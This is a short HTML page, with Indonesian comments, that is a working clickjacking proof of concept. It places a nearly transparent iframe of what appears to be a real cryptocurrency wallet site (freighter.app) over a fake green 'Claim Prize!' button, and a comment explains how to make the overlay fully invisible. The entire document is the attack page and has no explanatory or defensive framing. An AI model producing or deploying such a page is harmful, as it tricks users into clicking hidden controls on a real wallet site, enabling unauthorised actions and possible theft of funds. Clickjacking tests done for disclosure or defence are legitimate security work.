<!DOCTYPE html>
<html>
<head>
    <style>
        #target-container {
            position: relative;
            width: 500px;
            height: 400px;
        }
        /* Tombol palsu yang dilihat pengguna */
        .fake-btn {
            position: absolute;
            top: 150px;
            left: 100px;
            width: 120px;
            height: 40px;
            background-color: green;
            color: white;
            text-align: center;
            line-height: 40px;
            font-family: sans-serif;
            z-index: 1;
        }
        /* Iframe target dibuat transparan */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 600px;
            height: 500px;
            opacity: 0.1; /* Ubah ke 0 untuk transparansi penuh */
            z-index: 2;
        }
    </style>
</head>
<body>
    <div id="target-container">
        <div class="fake-btn">Klaim Hadiah!</div>
        <!-- Muat halaman rentan ke dalam iframe -->
        <iframe src="https://freighter.app/"></iframe>
    </div>
</body>
</html>
